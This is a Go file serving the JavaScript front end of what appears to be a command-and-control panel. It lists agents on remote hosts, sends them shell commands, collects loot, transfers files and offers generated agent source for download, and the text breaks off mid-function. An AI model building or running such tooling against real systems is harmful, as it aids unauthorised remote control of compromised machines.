package web_ui
import (
	"net/http"
	"fmt"
)
func Js(error_str,web_route,web_js,web_css string, sessionSlice []string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		//必须先登录
		_, ok := CheckUserSession(r, sessionSlice, error_str)
        if !ok {
            w.WriteHeader(http.StatusNotFound)
            fmt.Fprint(w, error_str)
            return
        }
		if r.Method == http.MethodGet {
html := `
if (!window.AgentTaskId) {
    window.AgentTaskId = Math.random().toString(36).substring(2) + Date.now();
}
if (!window.main_server) {
    window.main_server = window.location.host;
}
let server_data = [];
let User_data = [];
let server_plugin = [];
let chat_slice = [];

let msgQueues = {};
let resultQueues = {};
let fileQueues = {};
const checkTimeTimers = window.checkTimeTimers || (window.checkTimeTimers = {});
const checkTimeState = window.checkTimeState || (window.checkTimeState = {});
window.pendingCheckTimes = window.pendingCheckTimes || {};

window.resultTimers = window.resultTimers || {};
window.serverClientCounts = window.serverClientCounts || {};
window.onlineTeammates = window.onlineTeammates || [];
window.terminalSessions = window.terminalSessions || {};
window.fileManagerSessions = window.fileManagerSessions || {};
window.netInitTimer = window.netInitTimer || null;
window.shellInnetData = window.shellInnetData || {};

let resultTimers = window.resultTimers;
let serverClientCounts = window.serverClientCounts;
let onlineTeammates = window.onlineTeammates;
let pendingCheckTimes = window.pendingCheckTimes;

function createRuntimeTaskId(prefix = "task") {
    return prefix + "-" + Math.random().toString(36).slice(2) + Date.now();
}

function normalizeServerCountKey(value) {
    return String(value || "").trim().toLowerCase();
}

function escapeHtml(value) {
    return String(value || "")
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#39;");
}

function applyServerClientCountsToDom() {
    if (!Array.isArray(server_data)) {
        return;
    }
    server_data.forEach(function(server) {
        if (!server || typeof server.port === "undefined") {
            return;
        }
        const port = String(server.port);
        const count = String(serverClientCounts[port] || 0);
        const clientNode = document.getElementById(port);
        if (clientNode) {
            clientNode.textContent = count;
        }
    });
}

function rebuildServerClientCounts(agentList) {
    const countsByRemark = {};
    const nextCounts = {};
    const list = Array.isArray(agentList) ? agentList : [];

    list.forEach(function(agent) {
        if (!agent) {
            return;
        }
        const key = normalizeServerCountKey(agent.server || agent.Server);
        if (!key) {
            return;
        }
        countsByRemark[key] = (countsByRemark[key] || 0) + 1;
    });

    if (Array.isArray(server_data)) {
        server_data.forEach(function(server) {
            if (!server || typeof server.port === "undefined") {
                return;
            }
            const port = String(server.port);
            const remarkKey = normalizeServerCountKey(
                server.remark || server.Remark || server.server || server.Server
            );
            nextCounts[port] = countsByRemark[remarkKey] || 0;
        });
    }

    Object.keys(serverClientCounts).forEach(function(port) {
        delete serverClientCounts[port];
    });
    Object.assign(serverClientCounts, nextCounts);
    applyServerClientCountsToDom();
}

function applyNetData(uid, list) {
    if (!uid) {
        return;
    }
    const safeList = Array.isArray(list) ? list : [];

    window.shellInnetData = window.shellInnetData || {};
    window.shellInnetData[uid] = safeList.flatMap(function(item) {
        if (item && Array.isArray(item.shell_innet)) {
            return item.shell_innet;
        }
        return [];
    }).filter(Boolean);

    const shellSelect = document.getElementById("net_shell");
    if (shellSelect && shellSelect.value === uid) {
        let net = new lain_net();
        net.getshellip(window.shellInnetData[uid], uid);
        net.renderNetList(safeList, uid);
    }
}


function getCookie(name) {
    let cookies = document.cookie.split('; ');
    for (let i = 0; i < cookies.length; i++) {
        let cookie = cookies[i];
        let cookieParts = cookie.split('=');
        if (cookieParts[0] === name) {
            return cookieParts[2];
        }
    }
    return null;
}
const Username = getCookie("cookie");

class WebSocketClient {
    constructor(url, options = {}){
        this.url = url;
        this.options = options;
        this.ws = null;
        this.currentDownload = null;
        this.connectPromise = null;
        this.pendingWaiters = new Set();
        this.manualClose = false;
        this.reconnectTimer = null;
        this.reconnectDelay = 2000; // 2秒后重试
        this.enableResumeReconnect = options.enableResumeReconnect !== false;
        this.enableAutoReconnect = options.enableAutoReconnect !== false;
        this.useDedicatedTransfers = options.useDedicatedTransfers !== false;

        if (this.enableResumeReconnect) {
            this.bindResumeReconnect();
        }
    }

    bindResumeReconnect(){
        const tryReconnect = () => {
            if (this.manualClose) {
                return;
            }
            this.ensureConnected().catch((err) => {
                console.log("resume reconnect failed:", err.message);
            });
        };

        window.addEventListener("pageshow", tryReconnect);

        window.addEventListener("focus", tryReconnect);

        window.addEventListener("online", tryReconnect);

        document.addEventListener("visibilitychange", () => {
            if (document.visibilityState === "visible") {
                tryReconnect();
            }
        });
    }

    _rejectWaitersForSocket(targetWs, err){
        for (const waiter of Array.from(this.pendingWaiters)) {
            if (waiter.ws === targetWs) {
                try { waiter.reject(err); } catch (_) {}
            }
        }
        if (this.currentDownload && this.currentDownload.ws === targetWs) {
            this.rejectDownload(err);
        }
    }

    _rejectAllWaiters(err){
        for (const waiter of Array.from(this.pendingWaiters)) {
            try { waiter.reject(err); } catch (_) {}
        }
        this.pendingWaiters.clear();
        if (this.currentDownload) {
            this.rejectDownload(err);
        }
    }
    scheduleReconnect(){
        if (!this.enableAutoReconnect || this.manualClose || this.reconnectTimer) {
            return;
        }
        this.reconnectTimer = setTimeout(() => {
            this.reconnectTimer = null;
            this.connect().catch((err) => {
                console.error("reconnect failed:", err);
            });
        }, this.reconnectDelay);
    }
    connect(){
        if(this.ws && this.ws.readyState === WebSocket.OPEN){
            return Promise.resolve(true);
        }

        if(this.ws && this.ws.readyState === WebSocket.CONNECTING && this.connectPromise){
            return this.connectPromise;
        }

        if(this.connectPromise){
            return this.connectPromise;
        }

        this.manualClose = false;
        console.log("connect:", this.url);

        const connectPromise = new Promise((resolve, reject)=>{
            const ws = new WebSocket(this.url);
            this.ws = ws;
            ws.binaryType = "arraybuffer";

            ws.onopen = ()=>{
                console.log("websocket connected");

                if (this.reconnectTimer) {
                    clearTimeout(this.reconnectTimer);
                    this.reconnectTimer = null;
                }

                if (this.ws === ws && this.connectPromise === connectPromise) {
                    this.connectPromise = null;
                }

                resolve(true);
            };

            ws.onmessage = async (event) => {
                if (typeof event.data !== "string") {
                    this.handleBinaryMessage(event.data);
                    return;
                }
                let msg;
                try {
                    msg = JSON.parse(event.data);
                } catch (e) {
                    console.error("json parse error:", event.data);
                    return;
                }
                if (await this.handleDownloadMessage(msg)) {
                    return;
                }
                this.handleMessage(msg);
            };

            ws.onerror = (err)=>{
                console.error("websocket error:", err);
            };

            ws.onclose = (event)=>{
                console.log("websocket closed", event.code, event.reason);

                const isCurrentSocket = this.ws === ws;
                const isCurrentConnect = this.connectPromise === connectPromise;

                if (isCurrentSocket) {
                    this.ws = null;
                }

                if (isCurrentConnect) {
                    this.connectPromise = null;
                    reject(new Error("websocket closed before open"));
                }

                this._rejectWaitersForSocket(ws, new Error("websocket closed"));

                if (isCurrentSocket && !this.manualClose) {
                    this.scheduleReconnect();
                }
            };
        });

        this.connectPromise = connectPromise;
        return connectPromise;
    }

    async ensureConnected(timeout = 5000){
        if(this.ws && this.ws.readyState === WebSocket.OPEN){
            return true;
        }
        const connectPromise = this.connect();
        if(!connectPromise){
            return false;
        }
        let timeoutId = null;
        const timeoutPromise = new Promise((_, reject)=>{
            timeoutId = setTimeout(()=>{
                reject(new Error("websocket connect timeout"));
            }, timeout);
        });
        try{
            await Promise.race([connectPromise, timeoutPromise]);
        } finally {
            if (timeoutId) {
                clearTimeout(timeoutId);
            }
        }
        return this.ws && this.ws.readyState === WebSocket.OPEN;
    }

    async send(path, body = {}){
        if(!this.ws || this.ws.readyState !== WebSocket.OPEN){
            try{
                await this.ensureConnected();
            }catch(e){
                console.error("websocket not connected", e);
                return false;
            }
        }
        if(!this.ws || this.ws.readyState !== WebSocket.OPEN){
            console.error("websocket not connected");
            return false;
        }
        try{
            this.ws.send(JSON.stringify({ path, body }));
            return true;
        }catch(e){
            console.error("send error:", e);
            return false;
        }
    }

    async sendBinary(data){
        if(!this.ws || this.ws.readyState !== WebSocket.OPEN){
            console.error("websocket not connected");
            return false;
        }
        try{
            this.ws.send(data);
            return true;
        }catch(e){
            console.error("binary send error:", e);
            return false;
        }
    }
    waitForMessage(matcher, timeout = 65000){
        return new Promise((resolve, reject)=>{
            if(!this.ws || this.ws.readyState !== WebSocket.OPEN){
                reject(new Error("websocket not connected"));
                return;
            }

            const ws = this.ws;
            const waiter = {
                ws: ws,
                reject: null
            };
            let timer = null;

            const cleanup = ()=>{
                if(timer){
                    clearTimeout(timer);
                    timer = null;
                }
                ws.removeEventListener("message", listener);
                ws.removeEventListener("close", onClose);
                this.pendingWaiters.delete(waiter);
            };

            const listener = (event)=>{
                let msg;
                try{
                    msg = JSON.parse(event.data);
                }catch(e){
                    return;
                }
                if(!matcher(msg)){
                    return;
                }
                cleanup();
                resolve(msg);
            };

            const onClose = ()=>{
                cleanup();
                reject(new Error("websocket closed"));
            };

            waiter.reject = (err)=>{
                cleanup();
                reject(err);
            };

            this.pendingWaiters.add(waiter);
            ws.addEventListener("message", listener);
            ws.addEventListener("close", onClose);

            if (typeof timeout === "number" && timeout > 0) {
                timer = setTimeout(()=>{
                    cleanup();
                    reject(new Error("wait message timeout"));
                }, timeout);
            }
        });
    }
    handleBinaryMessage(data) {
        if (!this.currentDownload || !this.currentDownload.started) {
            return;
        }

        this.currentDownload.chunks.push(data);
        this.refreshDownloadTimer();
    }

    async handleDownloadMessage(msg) {
        const task = this.currentDownload;
        if (!task) {
            return false;
        }

        if (msg.path !== task.path) {
            return false;
        }

        if (msg.code && msg.code !== 200) {
            this.rejectDownload(new Error(msg.message || "download failed"));
            return true;
        }

        const isEnd =
            msg.type === "file_end" ||
            (msg.path === "downloadlog" && msg.message === "download finished");

        if (isEnd) {
            task.filename = msg.filename || task.filename;
            task.size = typeof msg.size === "number" ? msg.size : task.size;

            if (typeof msg.nextOffset === "number") {
                task.offset = msg.nextOffset;
                task.received = msg.nextOffset;
            } else if (typeof msg.sentSize === "number") {
                task.received += msg.sentSize;
                task.offset += msg.sentSize;
            }

            this.notifyDownloadProgress(task);

            const eof = !!msg.eof || (task.size > 0 && task.received >= task.size);

            if (!eof) {
                this.refreshDownloadTimer();
                await this.requestNextDownloadChunk();
                return true;
            }

            clearTimeout(task.timer);

            const blob = new Blob(task.chunks, {
                type: "application/octet-stream"
            });

            task.received = task.size || blob.size;
            this.notifyDownloadProgress(task);

            const result = {
                filename: task.filename || "download.bin",
                size: task.received,
                blob,
            };

            this.currentDownload = null;
            this.saveDownloadedFile(result.filename, result.blob);
            task.resolve(result);
            return true;
        }

        const isStart =
            msg.type === "file_start" ||
            (msg.path === "downloadlog" &&
                msg.filename &&
                typeof msg.size === "number");

        if (isStart) {
            task.started = true;
            task.filename = msg.filename || task.filename;
            task.size = typeof msg.size === "number" ? msg.size : task.size;
            task.offset = typeof msg.offset === "number" ? msg.offset : task.offset;
            this.notifyDownloadProgress(task);
            this.refreshDownloadTimer();
            return true;
        }

        return false;
    }

    rejectDownload(err) {
        if (!this.currentDownload) {
            return;
        }

        clearTimeout(this.currentDownload.timer);
        this.currentDownload.reject(err);
        this.currentDownload = null;
    }

    createTransferClient() {
        return new WebSocketClient(this.url, {
            enableResumeReconnect: false,
            enableAutoReconnect: false,
            useDedicatedTransfers: false,
        });
    }

    async _downloadFileInternal(path, body = {}, timeout = 65000, chunkSize = 1024 * 1024, onProgress = null) {
        if (!await this.ensureConnected().catch(() => false)) {
            throw new Error("websocket not connected");
        }

        if (this.currentDownload) {
            throw new Error("another download is in progress");
        }

        const downloadPromise = new Promise((resolve, reject) => {
            this.currentDownload = {
                ws: this.ws,
                path,
                body: { ...body },
                chunkSize,
                timeout,
                onProgress,
                chunks: [],
                filename: null,
                size: 0,
                received: 0,
                offset: 0,
                started: false,
                resolve,
                reject,
                timer: null,
            };
        });

        this.refreshDownloadTimer();

        const sent = await this.send(path, {
            ...body,
            offset: 0,
            chunkSize,
        });

        if (!sent) {
            this.rejectDownload(new Error("send download request failed"));
        }

        return downloadPromise;
    }

    async downloadFile(path, body = {}, timeout = 65000, chunkSize = 1024 * 1024, onProgress = null) {
        if (!this.useDedicatedTransfers) {
            return this._downloadFileInternal(path, body, timeout, chunkSize, onProgress);
        }

        const transferClient = this.createTransferClient();
        try {
            return await transferClient._downloadFileInternal(path, body, timeout, chunkSize, onProgress);
        } finally {
            transferClient.close();
        }
    }

    async requestNextDownloadChunk() {
        const task = this.currentDownload;
        if (!task) {
            return;
        }

        const sent = await this.send(task.path, {
            ...task.body,
            offset: task.offset,
            chunkSize: task.chunkSize,
        });

        if (!sent) {
            this.rejectDownload(new Error("send next download chunk failed"));
        }
    }

    async downloadLog(chunkSize = 1024 * 1024) {
        const toastId = createTransferToastId("download-log");
        try {
            const result = await this.downloadFile(
                "downloadlog",
                {},
                65000,
                chunkSize,
                (received, total) => {
                    const percent = total > 0
                        ? Math.min(100, Math.floor(received / total * 100))
                        : 0;
                    customTransferToast(toastId, {
                        title: "Download log",
                        percent,
                        state: "active",
                        detail: formatTransferBytes(received) + " / " + formatTransferBytes(total),
                    });
                }
            );
            customTransferToast(toastId, {
                title: "Download log",
                percent: 100,
                state: "done",
                detail: result.filename,
                removeAfter: 1200,
            });
            return result;
        } catch (err) {
            customTransferToast(toastId, {
                title: "Download log",
                percent: 0,
                state: "error",
                detail: err.message || "download failed",
                removeAfter: 2000,
            });
            throw err;
        }
    }

    notifyDownloadProgress(task) {
        if (!task || typeof task.onProgress !== "function") {
            return;
        }

        try {
            task.onProgress(task.received, task.size);
        } catch (err) {
            console.error("download progress callback error:", err);
        }
    }

    refreshDownloadTimer() {
        const task = this.currentDownload;
        if (!task) {
            return;
        }

        if (task.timer) {
            clearTimeout(task.timer);
        }

        task.timer = setTimeout(() => {
            this.rejectDownload(new Error("download timeout"));
        }, task.timeout);
    }

    saveDownloadedFile(filename, blob) {
        const url = URL.createObjectURL(blob);
        const link = document.createElement("a");
        link.href = url;
        link.download = filename || "download.bin";
        document.body.appendChild(link);
        link.click();
        link.remove();

        setTimeout(() => {
            URL.revokeObjectURL(url);
        }, 1000);
    }

    async _sendFileInternal(path, body, file, chunkSize, onProgress){
        if(!await this.ensureConnected().catch(()=>false)){
            throw new Error("websocket not connected");
        }
        const readyPromise = this.waitForMessage((msg)=>{
            return msg.path === path && (msg.type === "ready" || msg.code >= 400)
        });
        const requestSent = await this.send(path, body);
        if(!requestSent){
            throw new Error("send request failed");
        }
        const readyMsg = await readyPromise;
        if(readyMsg.code && readyMsg.code !== 200){
            throw new Error(readyMsg.message || "server not ready");
        }
        await this.uploadBinary(file, chunkSize, onProgress);
        const resultPromise = this.waitForMessage((msg)=>{
            return msg.path === path && msg.type !== "ready"
        });
        const endSent = await this.send("upload_end", { type: "upload_end" });
        if(!endSent){
            throw new Error("send upload_end failed");
        }
        const resultMsg = await resultPromise;
        if(resultMsg.code && resultMsg.code !== 200){
            throw new Error(resultMsg.message || "upload failed");
        }
        return resultMsg;
    }

    async sendFile(path, body, file, chunkSize, onProgress){
        if (!this.useDedicatedTransfers) {
            return this._sendFileInternal(path, body, file, chunkSize, onProgress);
        }

        const transferClient = this.createTransferClient();
        try {
            return await transferClient._sendFileInternal(
                path,
                body,
                file,
                chunkSize,
                onProgress
            );
        } finally {
            transferClient.close();
        }
    }

    async uploadBinary(file, chunkSize = 64 * 1024, onProgress = null){
        let offset = 0;
        while(offset < file.size){
            let chunk = file.slice(
                offset,
                offset + chunkSize
            );
            let buffer = await chunk.arrayBuffer();
            const sent = await this.sendBinary(buffer);
            if(!sent){
                throw new Error("binary send failed");
            }
            offset = Math.min(offset + chunkSize, file.size);
            if(onProgress){
                onProgress(offset, file.size);
            }
            console.log("upload:", offset, "/", file.size);
        }
    }

    close(){
        this.manualClose = true;
        if (this.reconnectTimer) {
            clearTimeout(this.reconnectTimer);
            this.reconnectTimer = null;
        }
        this._rejectAllWaiters(new Error("websocket closed"));
        if(this.ws){
            this.ws.close();
            this.ws = null;
        }
        this.connectPromise = null;
    }

    handleMessage(msg) {
        console.log(
            "PATH:", msg.path,
            "received:", msg
        );
        switch(msg.path) {
            case "getResults":
                if (msg.data && String(msg.data).trim()) {
                    const shell = (window.terminalSessions && window.terminalSessions[msg.uid]) ||
                        window.activeTerminal;
                    if (shell) {
                        shell.handleResult(msg);
                    }
                    console.log("getResults:", msg.data);
                }
                break;
            case "log":
                this.handleLog(msg);
                break;
            case "listen":
                this.handleListen(msg);
                break;
            case "agentList":
                this.handleAgentList(msg);
                break;
            case "winAgentList":
                break;
            case "chat":
                chat_slice = msg.data;
                this.handleChat(msg);
                break;
            case "loot":
                if(msg.data){
                    let lootIndex = new lain_index();
                    lootIndex.loothander(msg.data);
                }
                break;
            case "server":
                this.handleServer(msg);
                break;
            case "PluginList":
                this.handlePlugin(msg);
                break;
            case "check_time":
                this.handleCheck(msg);
                break;
            case "onlineteamment":
                if (msg.code === 200 || msg.data) {
                    this.handleOnlineTeammates(msg);
                }
                break;
            case "getShellInnet":
                if (msg.code === 200) {
                    if (msg.uid) {
                        window.shellInnetData[msg.uid] = msg.data;
                    }
                    const selectedUid = document.getElementById("net_shell") ?
                        document.getElementById("net_shell").value :
                        "";
                    if (selectedUid && (!msg.uid || selectedUid === msg.uid)) {
                        let netInstance = new lain_net();
                        netInstance.getshellip(msg.data, selectedUid);
                    }
                }
                break;
            case "insertKey":
                if(msg.code === 200){
                    console.log("Key inserted successfully");
                } else {
                    console.log("Failed to insert key: " + msg.message);
                }
                break;
            case "insertPlugin":
                if(msg.code === 200){
                    customLog(msg.message || "Plugin inserted successfully");
                } else {
                    customAlert(msg.message || "Insert plugin failed");
                }
                break;
            case "delPlugin":
                if(msg.code === 200){
                    customLog(msg.message || "Plugin deleted successfully");
                } else {
                    customAlert(msg.message || "Delete plugin failed");
                }
                break;
            case "agentcode":
                if(msg.code===200){
                    let blob = new Blob(
                        [msg.data],
                        {
                            type:"text/plain"
                        }
                    );
                    let a = document.createElement("a");
                    a.href = URL.createObjectURL(blob);
                    a.download = "agent.go";
                    a.click();
                }
                break;
            case "sendChat":
                if (msg.code===200){
                    document.getElementById("chat_input").value = "";
                }
                break;
            case "deleteChat":
                if(msg.code===200){
                    customLog("Deleted successfully");
                }
                break;
            case "GetMsgList":
                if (msg.data) {
                    let uid = msg.data.uid;
                    msgQueues[uid] = Array.isArray(msg.data.data) ?
                        msg.data.data :
                        [];
                }
                break;
            case "GetMsgPost":
                if (msg.data) {
                    let uid = msg.data.uid;
                    resultQueues[uid] = Array.isArray(msg.data.data) ?
                        msg.data.data :
                        [];
                }
                break;
            case "GetMsgCache":
                if (msg.data) {
                    let uid = msg.data.uid;
                    fileQueues[uid] = Array.isArray(msg.data.data) ?
                        msg.data.data :
                        [];
                    const fileManager = window.fileManagerSessions ?
                        window.fileManagerSessions[uid] :
                        null;
                    if (fileManager) {
                        fileManager.history_file(uid);
                    } else if (window.activeFileManager &&
                        window.activeFileManager.uid === uid) {
                        window.activeFileManager.history_file(uid);
                    }
                }
                break;
            case "GetMsgNet":
                if (msg.data) {
                    const uid = msg.data.uid;
                    const list = Array.isArray(msg.data.data) ? msg.data.data : [];
                    applyNetData(uid, list);
                }
                break;
            case "getNetdata":
                if (msg.code === 200) {
                    const shellSelect = document.getElementById("net_shell");
                    const uid = shellSelect ? shellSelect.value : "";
                    const list = Array.isArray(msg.data) ? msg.data : [];
                    applyNetData(uid, list);
                }
                break;
            default:
                console.log("not handled:", msg.path);
                break;
        }
    }

    handleLog(msg) {
        if(!msg.data || !msg.data.length){
            return;
        }
        let logDiv = document.getElementById("log-content");
        if(!logDiv){
            console.error("Log content div not found.");
            return;
        }
        let html = "";
        for(let i = 0; i < msg.data.length; i++) {
            html += "[" + msg.data[i].time + "] : " + msg.data[i].message + "<br>";
        }
        logDiv.innerHTML = html;
    }

    handleChat(msg){
        let indexchat = new lain_chat();
        let chat_div = document.getElementById("chat_div");
        chat_div.innerHTML = "";
        if (!msg || !Array.isArray(msg.data)) {
            console.error("Invalid chat data");
            return;
        }
        for (let i = 0; i < msg.data.length; i++) {
            indexchat.renderChatItem(msg.data[i]);
        }
    }

    handleListen(msg) {
        let indexInstance = new index();
        indexInstance.renderClients(msg.data);
    }

    handleAgentList(msg) {
        let indexInstance = new lain_index();
        User_data = (msg.data && msg.data.length) ?
            (Array.isArray(msg.data) ? msg.data : []) :
            [];
        if(User_data.length > 0) {
            indexInstance.renderUserList(User_data);
            net_init();
            rebuildServerClientCounts(User_data);
        } else {
            indexInstance.renderUserList([]);
            net_init();
            rebuildServerClientCounts([]);
        }

        Object.keys(pendingCheckTimes).forEach((uid) => {
            indexInstance.checkTime(pendingCheckTimes[uid], true);
        });
    }

    handleServer(msg){
        let indexServer = new lain_server();
        server_data = msg.data;
        indexServer.updateServerIndex();
        indexServer.initServerIndexClickHandler();
        rebuildServerClientCounts(User_data);
        indexServer.requestOnlineTeammates();
    }

    handlePlugin(msg){
        server_plugin = Array.isArray(msg.data) ? msg.data : [];
        if (window.server && typeof window.server.refreshPluginList === "function") {
            window.server.refreshPluginList();
        }
    }

    handleCheck(msg) {
        if (!msg || !msg.data || !msg.data.uid) return;
        pendingCheckTimes[msg.data.uid] = msg.data;
        const indexCheck = window.lainIndex || new lain_index();
        indexCheck.checkTime(msg.data, true);
    }

    handleOnlineTeammates(msg){
        onlineTeammates = Array.isArray(msg.data) ? msg.data : [];
        window.onlineTeammates = onlineTeammates;
        let serverUi = new lain_server();
        serverUi.renderOnlineTeammatesCard();
    }
}

const webSocketClient = new WebSocketClient(
    "wss://" + main_server + "/"+"`+web_route+`"
);

webSocketClient.connect().catch(()=>{});

window.addEventListener("beforeunload", ()=>{
    webSocketClient.close(true);
});

class index{
    renderClients(clients){
        if (typeof clients === "string") {
            try {
                clients = JSON.parse(clients);
            } catch (e) {
                console.error("Invalid JSON data", e);
                return;
            }
        }
        var div = document.getElementById('div_conn');
        // 鍏堟竻绌哄綋鍓嶆樉绀�
        while(div.firstChild){
            div.removeChild(div.firstChild);
        }
        // 绌烘暟缁勭洿鎺ユ樉绀轰负绌�
        if (!clients || !Array.isArray(clients)) {
            console.error("Invalid clients data");
            return;
        }
        if (clients.length === 0) {
            return;
        }
        for(let i = 0; i < clients.length; i++){
            let c = clients[i];
        
            var container = document.createElement('div');
            container.className = 'client-card';
            container.id = "container-" + c.uid;
            container.dataset.uid = c.uid;
        
            var pUid = document.createElement('p');
			pUid.innerHTML = '<span>Uid</span>' + c.uid;

			var pHost = document.createElement('p');
			pHost.innerHTML = '<span>Host</span>' + c.host;

			var pTime = document.createElement('p');
			pTime.innerHTML = '<span>Online</span>' + c.online_time;

			var pIP = document.createElement('p');
			pIP.innerHTML = '<span>IP</span>' + c.shell_ip;
        
            var btnReceive = document.createElement('button');
            btnReceive.textContent = "Receive";
            btnReceive.className = "btn receive";
            btnReceive.onclick = () => {
                get_conn(c.uid, c.host);
            };
        
            var btnRemove = document.createElement('button');
            btnRemove.textContent = "Remove";
            btnRemove.className = "btn remove";
            btnRemove.onclick = async () => {
                const ok = await del_conn(String(i));
                if (ok) {
                    container.remove();
                }
            };
        
        
            var btnBox = document.createElement('div');
            btnBox.className = "btn-box";
        
            btnBox.appendChild(btnReceive);
            btnBox.appendChild(btnRemove);
        
        
            container.appendChild(pUid);
            container.appendChild(pHost);
            container.appendChild(pTime);
            container.appendChild(pIP);
            container.appendChild(btnBox);
        
            div.appendChild(container);
        }
    }
        async get(uid,shellname){
            const confirm1 = await customConfirm("confirm?");
            if(!confirm1){
                return false;
            }
            const sent = await webSocketClient.send(
                "insertKey",
                {
                    uid:uid,
                    request:shellname
                }
            );
            return sent ? uid : false;
        }
        async del(index, info = "") {
            const confirmed = await customConfirm("confirm?");
            if (!confirmed) {
                return false;
            }
            const responsePromise = webSocketClient.waitForMessage(
                (msg) => msg.path === "delIndex" &&
                 msg.code === 200 &&
                  msg.uid === String(index) &&
                  msg.taskid === AgentTaskId,
            )
            const sent = await webSocketClient.send(
                "delIndex",
                {
                    uid: String(index),
                    taskid: AgentTaskId
                }
            );
            if (!sent) {
                customLog("Delete agent failed");
                return false;
            }
            try {
                const result = await responsePromise;
                if (result && result.code === 200 && result.uid === String(index) && result.taskid === AgentTaskId) {
                    customLog("Agent removed");
                    return true;
                }
                customLog("Delete agent failed:", result);
                return false;
            } catch (err) {
                customLog("Delete agent error:", err.message);
                return false;
            }
        }
    }
      
      class lain_terminal{
        constructor() {
            this.uid = "";
            this.isMovingFile = false;
            this.move_file = this.move_file.bind(this);
            this.look_file = this.look_file.bind(this);
            this.intervalId = null;
            this.fileListPollTimer = null;
            this.fileListTaskId = "";
            this.fileListPendingDir = "";
            this.currentInput="";
            this.inputContainer="";
            this.terminalEl = null;
            this.dialogEl = null;
            this.currentTaskId = "";
            this.pendingTaskInputs = {};
            this.inputKeydown = this.inputKeydown.bind(this);
        }
        getDialogNode(selector) {
            if (this.dialogEl) {
                return this.dialogEl.querySelector(selector);
            }
            return document.querySelector(selector);
        }
        lain_time(uid, taskid, command) {
            if (!uid) {
                console.log("uid is empty");
                return false;
            }
            try {
                let key = uid + "*" + taskid;
                // 闃叉閲嶅鍚姩
                if(resultTimers[key]){
                    console.log("宸茬粡鍦ㄨ幏鍙�");
                    return false;
                }
                resultTimers[key] = setInterval(()=>{
                    webSocketClient.send(
                        "getResults",
                        {
                            uid: uid,
                            taskid: taskid
                        },
                        taskid
                    );
                },2000);
                this.appendOutput("sending msg >>" + command);
                return true;
            } catch(err) {
                console.error("Error:",err);
                return false;
            }
        }
        appendOutput(text, className = "output") {
            const terminalEl = this.terminalEl ||
                (this.dialogEl ? this.dialogEl.querySelector(".terminal") : document.querySelector(".terminal"));
            const inputContainer = this.inputContainer || (terminalEl ? terminalEl.querySelector(".input-container") : null);
            if (!terminalEl || !inputContainer) {
                return null;
            }
            const output = document.createElement("div");
            output.contentEditable = true;
            output.textContent = text;
            output.className = className;
            inputContainer.appendChild(output);
            terminalEl.scrollTop = terminalEl.scrollHeight;
            return output;
        }
        removeInputNode(inputEl) {
            if (!inputEl || !inputEl.isConnected) {
                return;
            }
            const prompt = inputEl.previousElementSibling;
            if (prompt && prompt.classList.contains("output") && prompt.textContent === "Command>") {
                prompt.remove();
            }
            inputEl.remove();
            if (this.currentInput === inputEl) {
                this.currentInput = "";
            }
        }
        stopGetResults(uid,taskid){
            let key = uid+"*"+taskid;
            if(resultTimers[key]){
                clearInterval(resultTimers[key]);
                delete resultTimers[key];
                console.log("stop result",taskid);
            }
        }
        stopAllResultsForUid(uid){
            if(!uid){
                return;
            }
            const prefix = uid + "*";
            Object.keys(resultTimers).forEach((key) => {
                if (key.indexOf(prefix) !== 0) {
                    return;
                }
                clearInterval(resultTimers[key]);
                delete resultTimers[key];
            });
            console.log("stop all results", uid);
        }
        handleResult(msg) {
            const taskid = msg.taskid || this.currentTaskId || AgentTaskId;
            const key = msg.uid + "*" + taskid;
            const taskInput = this.pendingTaskInputs[key] || null;
            delete this.pendingTaskInputs[key];
            this.stopGetResults(msg.uid, taskid);
            this.appendOutput(msg.data);
            if (taskInput && taskInput.isConnected) {
                this.removeInputNode(taskInput);
                this.createInput();
            } else if (!this.currentInput || !this.currentInput.isConnected) {
                this.createInput();
            }
        }
        async get(command){
            if(!this.uid){
                return;
            }
            this.sendjob('agent'); // ???????????
            try {
                const taskid = createRuntimeTaskId("terminal");
                const activeInput = this.currentInput && this.currentInput.isConnected
                    ? this.currentInput
                    : null;
                let result = await webSocketClient.send(
                    
                    "msg",
                    {
                        uid:this.uid,
                        msg:command,
                        taskid:taskid
                    }
                );
                if(result){
                    this.currentTaskId = taskid;
                    const started = this.lain_time(this.uid, taskid, command);
                    if (!started) {
                        this.appendOutput("task polling not started");
                        return;
                    }
                    this.pendingTaskInputs[this.uid + "*" + taskid] = activeInput;
                    if (activeInput && activeInput.isConnected) {
                        activeInput.value = "";
                        activeInput.focus();
                    }
                }
            } catch(err){
                console.error(err);
                if (this.currentInput && this.currentInput.isConnected) {
                    this.currentInput.focus();
                } else {
                    this.createInput();
                }
            }
        }
        async sendjob(str){
            const newPrompt = document.createElement('div');
            newPrompt.className = 'output';
            newPrompt.textContent = str+' SendMsg--->>';
            const terminal = this.terminalEl ||
                (this.dialogEl ? this.dialogEl.querySelector(".terminal") : null);
            const inputContainer = this.inputContainer ||
                (terminal ? terminal.querySelector(".input-container") : null);
            if (!terminal || !inputContainer) {
                return;
            }
            inputContainer.appendChild(newPrompt);
            terminal.scrollTop = terminal.scrollHeight;
        }
        createInput() {
            if (
                this.currentInput &&
                this.currentInput.isConnected
            ) {
                this.currentInput.focus();
                return;
            }
            const newPrompt = document.createElement('div');
            newPrompt.className = 'output';
            newPrompt.textContent = 'Command>';
            const newInput = document.createElement('input');
            newInput.type = 'text';
            newInput.className = 'shell-input';
            newInput.addEventListener('keydown', this.inputKeydown);
            this.inputContainer.appendChild(newPrompt);
            this.inputContainer.appendChild(newInput);
            newInput.focus();
            this.currentInput = newInput;
        }
        async inputKeydown(event) {
            if (event.key === 'Enter') {
                event.preventDefault();
                const inputEl = event.target;
                if (!inputEl) {
                    return;
                }
                this.currentInput = inputEl;
                const command = inputEl.value.trim();
                if (command) {
                    await this.get(command);
                    // ?????? await lain_time ?? createInput???????? get ?????
                }
            }
        }
        async loadFile(file_name, fileSize){
            if(!fileSize || !file_name){
                return false;
            }
            let splitSizeInput = this.getDialogNode('#splitSize');
            let splitSize = splitSizeInput && splitSizeInput.value
                ? parseFloat(splitSizeInput.value) * 1024 * 1024
                : 0;
            let file_key = this.uid + "**///**" + file_name + "**///**" + splitSize;
            let powershell = "LOAD_U_FILE*//*" + file_key;
            webSocketClient.send(
                
                "msg",
                {
                    uid:this.uid,
                    msg:powershell,
